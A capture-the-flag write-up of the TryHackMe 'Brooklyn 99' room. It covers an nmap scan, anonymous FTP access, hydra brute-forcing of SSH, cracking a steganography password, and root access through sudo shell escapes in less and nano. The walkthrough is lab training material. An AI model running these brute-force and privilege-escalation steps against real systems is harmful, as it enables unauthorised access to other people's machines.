---
title:  "TryHackMe - Brooklyn 99 writeup"
header:
  teaser: "/assets/images/b99/b99_prev.jpg"
categories: 
  - TryHackMe
tags:
  - writeups
---

Brooklyn 99 is a great machine to get started. It combines pretty realistic components with CTF challenges. Especially recommend this machine to B-99 fans!

[Brooklyn 99 on TryHackMe](https://tryhackme.com/room/brooklynninenine)

<figure>
	<a href="/assets/images/b99/b99_prev.jpg"><img src="/assets/images/b99/b99_prev.jpg"></a>
</figure>

*NOTE: All passwords listed there are fake. Run listed commands to find real ones*

Hello, unsolved case, let's start.

## Enumeration
Starting with `nmap` to determine what ports are open and what services are running
I usually run with these options:

- T4 {T<0-5>: Set timing template (higher is faster)}

- p - {-p <port ranges>: Only scan specified ports, but in this case -p- will scan all ports (1-65535)}

- A - Enable OS detection, version detection, script scanning, and traceroute
  
Full command and result of scanning: 
{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ sudo nmap -T4 -p- -A -oN b99_nmap.txt 10.10.178.215
Nmap scan report for 10.10.178.215
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.57.246
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

{% endhighlight %}

After reviewing results of `nmap` scan we can create a plan for future actions:

1. `ftp` on port 21
2. `http page` on port 80
3. `ssh` on port 22

### FTP
Nmap scan showed us that `Anonymous FTP login allowed`, so let's use it.
{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ ftp 10.10.178.215
Connected to 10.10.178.215.
220 (vsFTPd 3.0.3)
Name (10.10.178.215:m0rn1ngstr): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.03 secs (3.8278 kB/s)

m0rn1ngstr@kali:~/THM/b99$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine


{% endhighlight %}

We logged in `ftp`, found a file called `note_to_jake.txt`, downloaded it, and then read. 

So Jake had a weak password, and something tells me he hasn't changed it yet. Let's make use of it.

> “Sarge, with all due respect, I am gonna completely ignore everything you just said.” — Jake Peralta

### Bruteforcing SSH
We can bruteforce a ssh account credentials using `hydra`. Syntax for this tool:

- t - run TASKS number of connects in parallel, for SSH 4 is suggested

- l - login, use only one username or a list

- P - password wordlist

{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ hydra -t 4 -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.178.215
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 06:50:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.178.215:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.178.215   login: jake   password: [jakespass]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-26 06:52:33

{% endhighlight %}

And, we got Jake's password. 

> "Cool, cool, cool, cool, cool. No doubt, no doubt, no doubt." — Jake Peralta

But let's not jump into gaining shell yet.
We still have HTTP page unchecked. 

### HTTP
After accessing this page in browser we saw this:

<figure>
	<a href="/assets/images/b99/b99_steg.jpg"><img src="/assets/images/b99/b99_steg.jpg"></a>
</figure>

Seems like nothing interesting here, but let's check source code:
<figure>
	<a href="/assets/images/b99/b99_sc.jpg"><img src="/assets/images/b99/b99_sc.jpg"></a>
</figure>

Hmmm, `Steganography`, exciting.

### Steganography
Firstly I tried `steghide` on downloaded picture, but it was protected with password.

Then I looked up steganography brute-force tools and found  [StegCracker](https://github.com/Paradoxis/StegCracker)
{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ stegcracker brooklyn99.jpg 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: fake_steg_pass
Tried 20203 passwords
Your file has been written to: brooklyn99.jpg.out

{% endhighlight %}

And secret hidden in the picture was revealed to us.

{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ cat brooklyn99.jpg.out 
Holts Password:
[holtspass]

Enjoy!!

{% endhighlight %}

> "Oh, I've caused a problem. I think I am getting a text message. Bloop. Ah, there it is." - Captain Holt

So we have holt's password too. 

##Gaining Shell and User flag

Since we have two variants of accessing this machine, let's try both. Starting with Jake, cause we found his password first.

### Jake
Access machine via `ssh` with Jake's credentials.
{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ ssh jake@10.10.178.215
The authenticity of host '10.10.178.215 (10.10.178.215)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.178.215' (ECDSA) to the list of known hosts.
jake@10.10.178.215's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$

{% endhighlight %}

Now let's find user's flag. Jake's `home directory` was empty. In `home` directory we have 3 folders: Jake, Holt, Amy. `User.txt` was in Holt's home directory.
{% highlight console %}
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls -l
total 8
-rw------- 1 root root 110 May 18 17:12 nano.save
-rw-rw-r-- 1 holt holt  33 May 17 21:49 user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
[user's flag]
jake@brookly_nine_nine:/home/holt$
{% endhighlight %}

### Holt
We also could log in as Holt via `ssh` with his credentials and read `user.txt`
{% highlight console %}
m0rn1ngstr@kali:~/THM/b99$ ssh holt@10.10.178.215
holt@10.10.178.215's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
[user's flag]

{% endhighlight %}


## Privilege escalation and Root flag
Here we also have two ways for `Privilege escalation`

###Jake
Let's check what command Jake can run with sudo
{% highlight console %}
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

{% endhighlight %}

With `less` we can just read `root.txt`
{% highlight console %}
jake@brookly_nine_nine:/~$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [root flag]

Enjoy!!

{% endhighlight %}

Or we can gain shell as root using [gtfobins](https://gtfobins.github.io/gtfobins/less/)
{% highlight console %}
jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/profile
# whoami
root
# hostname
brookly_nine_nine

{% endhighlight %}

### Holt
Let's check what command Holt can run with sudo
{% highlight console %}
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

{% endhighlight %}

And same situation here, we can just read `root.txt` with `nano`
{% highlight console %}
holt@brookly_nine_nine:~$ sudo /bin/nano /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [root flag]

Enjoy!!

{% endhighlight %}

Or we can gain shell as root using [gtfobins](https://gtfobins.github.io/gtfobins/nano/)
{% highlight console %}
holt@brookly_nine_nine:~$ sudo /bin/nano 
^R^X
Command to execute: reset; sh 1>&0 2>&0#                                                                     
# whoami
root
# hostname

{% endhighlight %}

### That's it for this machine. Stay safe and Happy Hacking!
